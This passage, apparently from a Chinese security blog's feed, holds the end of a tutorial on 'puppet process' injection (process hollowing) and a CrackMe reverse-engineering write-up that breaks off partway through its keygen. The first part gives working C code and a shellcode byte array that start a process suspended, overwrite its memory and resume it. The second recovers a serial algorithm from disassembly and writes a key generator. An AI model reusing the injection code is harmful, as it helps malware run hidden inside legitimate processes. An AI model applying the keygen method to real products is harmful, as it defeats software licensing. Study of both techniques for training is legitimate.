class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span><br>,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0D</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x1E</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x81</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x7E</span> ,<span class="hljs-number">0xFE</span><br>,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (ReplacProcess(<span class="hljs-string">&quot;C:\\Users\\Tophanter\\Desktop\\ConsoleApplication1.exe&quot;</span>) == TRUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;傀儡进程成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br>CONTEXT threadContext = &#123; <span class="hljs-number">0</span> &#125;;<br>RtlZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>RtlZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br>RtlZeroMemory(&amp;threadContext, <span class="hljs-keyword">sizeof</span>(threadContext));<br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>BOOL Flag = FALSE;<br><span class="hljs-comment">//创建挂起的进程</span><br>Flag = CreateProcess(pszFilePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建挂起进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取线程的上下文</span><br>threadContext.ContextFlags = CONTEXT_FULL;<br>Flag = GetThreadContext(pi.hThread, &amp;threadContext);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取线程上下文失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 拿到目标进程主线程上下文后，在Ebx寄存器中保存的就是PEB的地址，</span><br><span class="hljs-comment">// 而PEB结构偏移0x8的位置是AddressOfImageBase字段，</span><br><span class="hljs-comment">// 所以直接来读取ctx.Ebx+0x8，就可以获取到目标进程的加载基址</span><br>LPVOID lpBuffer = <span class="hljs-number">0</span>;<br>Flag = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + <span class="hljs-number">0x8</span>), &amp;lpBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;读取内存数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//写入shellcode</span><br>Flag = WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, data, <span class="hljs-keyword">sizeof</span>(data), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//恢复执行</span><br>ResumeThread(pi.hThread);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序可以看到成功弹出shellcode 的内容。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/1.png"></p><p>使用任务管理器查看可以看到傀儡进程。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p><p><a href="https://blog.csdn.net/cssxn/article/details/97645162">创建傀儡进程代码</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;傀儡进程&quot;&gt;&lt;a href=&quot;#傀儡进程&quot; class=&quot;headerlink&quot; title=&quot;傀儡进程&quot;&gt;&lt;/a&gt;傀儡进程&lt;/h4&gt;&lt;p&gt;借着正常的软件进程或者系统进程的外壳来进行恶意的操作。&lt;/p&gt;
&lt;h4 id=&quot;函数介绍&quot;&gt;&lt;a href=&quot;#函数介绍&quot; </summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="隐藏技术" scheme="https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-007</title>
    <link href="https://b1ackie.cn/2021/08/03/160CrackMe-007/"/>
    <id>https://b1ackie.cn/2021/08/03/160CrackMe-007/</id>
    <published>2021-08-03T02:52:32.000Z</published>
    <updated>2021-08-09T10:54:14.295Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。</p><p><img src="/2021/08/03/160CrackMe-007/1.png"></p><p>about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用delphi编写的。</p><p><img src="/2021/08/03/160CrackMe-007/2.png"></p><p>还是直接使用DeDark查看，然后去下断</p><p><img src="/2021/08/03/160CrackMe-007/3.png"></p><p>断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。</p><p><img src="/2021/08/03/160CrackMe-007/4.png"></p><p>进来之后果然看到了算法</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004429EE  |.  <span class="hljs-number">8945</span> F4       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>],<span class="hljs-built_in">eax</span><br>004429F1  |.  BE <span class="hljs-number">01000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x1</span><br>004429F6  |&gt;  8B45 F8       /<span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>004429F9  |.  E8 3610FCFF   |<span class="hljs-keyword">call</span> aLoNg3x_<span class="hljs-number">.</span>00403A34<br>004429FE  |.  83F8 <span class="hljs-number">01</span>       |<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span><br>00442A01  |.  7C <span class="hljs-number">1D</span>         |<span class="hljs-keyword">jl</span> short aLoNg3x_<span class="hljs-number">.</span>00442A20<br>00442A03  |&gt;  8B55 F8       |/<span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A06  |.  0FB65432 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">edx</span>+<span class="hljs-built_in">esi</span>-<span class="hljs-number">0x1</span>]<br>00442A0B  |.  8B4D F8       ||<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A0E  |.  0FB64C01 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">ecx</span>+<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1</span>]<br>00442A13  |.  0FAFD1        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ecx</span><br>00442A16  |.  0FAFD7        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edi</span><br>00442A19  |.  03DA          ||<span class="hljs-keyword">add</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A1B  |.  <span class="hljs-number">48</span>            ||<span class="hljs-keyword">dec</span> <span class="hljs-built_in">eax</span><br>00442A1C  |.  85C0          ||<span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00442A1E  |.^ <span class="hljs-number">75</span> E3         |\<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>00442A03<br>00442A20  |&gt;  <span class="hljs-number">46</span>            |<span class="hljs-keyword">inc</span> <span class="hljs-built_in">esi</span><br>00442A21  |.  FF4D F4       |<span class="hljs-keyword">dec</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>]<br>00442A24  |.^ <span class="hljs-number">75</span> D0         \<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>004429F6<br>00442A26  |&gt;  8BC3          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">ebx</span><br>00442A28  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A29  |.  33C2          <span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2B  |.  2BC2          <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2D  |.  B9 2A2C0A00   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0xA2C2A</span><br>00442<span class="hljs-built_in">A32</span>  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A33  |.  F7F9          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">ecx</span><br>00442A35  |.  8BDA          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A37  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A3A  |.  B9 <span class="hljs-number">59000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0x59</span><br>00442A3F  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A40  |.  F7F9          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">ecx</span><br>00442A42  |.  8BC8          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">eax</span><br>00442A44  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A47  |.  BE <span class="hljs-number">50000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x50</span><br>00442A4C  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A4D  |.  F7FE          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">esi</span><br>00442A4F  |.  03CA          <span class="hljs-keyword">add</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">edx</span><br>00442A51  |.  <span class="hljs-number">41</span>            <span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span><br>00442A52  |.  <span class="hljs-number">894D</span> FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>],<span class="hljs-built_in">ecx</span><br>00442A55  |.  3B5D FC       <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br></code></pre></div></td></tr></table></figure><p>但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。</p><p><img src="/2021/08/03/160CrackMe-007/5.png"></p><p>往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。</p><p><img src="/2021/08/03/160CrackMe-007/6.png"></p><p>出函数之后，看到eax的值是通过一个地址传递的</p><p><img src="/2021/08/03/160CrackMe-007/7.png"></p><p>继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看</p><p><img src="/2021/08/03/160CrackMe-007/8.png"></p><p>进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。</p><p><img src="/2021/08/03/160CrackMe-007/9.png"></p><p>继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442ACD</span>  |.  B9 <span class="hljs-number">01000000</span>   mov ecx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442AD2</span>  |&gt;  <span class="hljs-number">8B45</span> FC       /mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AD5</span>  |.  <span class="hljs-number">0FB60408</span>      |movzx eax,byte ptr ds:[eax+ecx]<br><span class="hljs-number">00442AD9</span>  |.  BF <span class="hljs-number">11000000</span>   |mov edi,<span class="hljs-number">0x11</span><br><span class="hljs-number">00442ADE</span>  |.  33D2          |xor edx,edx<br><span class="hljs-number">00442AE0</span>  |.  F7F7          |div edi<br><span class="hljs-number">00442AE2</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442AE3</span>  |.  <span class="hljs-number">8B45</span> FC       |mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AE6</span>  |.  <span class="hljs-number">0FB64408</span> FF   |movzx eax,byte ptr ds:[eax+ecx-<span class="hljs-number">0x1</span>]<br><span class="hljs-number">00442AEB</span>  |.  <span class="hljs-number">0FAFD0</span>        |imul edx,eax<br><span class="hljs-number">00442AEE</span>  |.  <span class="hljs-number">03F2</span>          |add esi,edx<br><span class="hljs-number">00442AF0</span>  |.  <span class="hljs-number">41</span>            |inc ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442AF1</span>  |.  4B            |dec ebx<br><span class="hljs-number">00442AF2</span>  |.^ <span class="hljs-number">75</span> DE         \jnz short aLoNg3x_.<span class="hljs-number">00442AD2</span><br><span class="hljs-number">00442AF4</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442AF8</span><br><span class="hljs-number">00442AF6</span>  |&gt;  33F6          xor esi,esi<br><span class="hljs-number">00442AF8</span>  |&gt;  8BC6          mov eax,esi<br><span class="hljs-number">00442AFA</span>  |.  B9 <span class="hljs-number">48710000</span>   mov ecx,<span class="hljs-number">0x7148</span><br><span class="hljs-number">00442AFF</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B00</span>  |.  F7F9          idiv ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442B02</span>  |.  8BC2          mov eax,edx<br><span class="hljs-number">00442B04</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B05</span>  |.  33C2          xor eax,edx                              ;  XOR0<br><span class="hljs-number">00442B07</span>  |.  2BC2          sub eax,edx                              ;  -<span class="hljs-number">0</span><br><span class="hljs-number">00442B09</span>  |.  8BD8          mov ebx,eax<br><span class="hljs-number">00442B0B</span>  |.  33C0          xor eax,eax<br></code></pre></div></td></tr></table></figure><p>这里会生成一个标志值，用于后面的计算</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br></code></pre></div></td></tr></table></figure><p>生成标志值之后就可以继续刚才的算法计算了，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>到这里算出了一个可以用的codice</p><p><img src="/2021/08/03/160CrackMe-007/11.png"></p><p>输入后发现又出现了一个again按钮。</p><p><img src="/2021/08/03/160CrackMe-007/10.png"></p><p>从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了</p><p><img src="/2021/08/03/160CrackMe-007/12.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><p>完整注册机如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">//字母</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFlagNumber</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szCodice)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szName,<span class="hljs-keyword">int</span> FlagNumber)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span 